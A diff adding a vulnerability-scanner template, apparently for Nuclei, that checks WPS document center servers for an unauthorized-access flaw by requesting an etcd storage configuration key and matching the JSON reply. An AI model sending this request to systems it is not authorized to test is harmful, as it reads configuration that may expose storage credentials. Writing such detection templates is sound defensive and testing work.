@@ -1,0 +1,26 @@
+id: WPS-operate-unauthorized
+
+info:
+  name: WPS文档中心和文档中台 operate 未授权访问漏洞
+  author: WPS
+  severity: medium
+  tags: unauthorized
+
+http:
+  - raw:
+      - |
+        GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":'
+          - '"msg":'
+          - '"data":'
+          - '"value":'
+        condition: and
+      - type: status
+        status: 
+          - 200
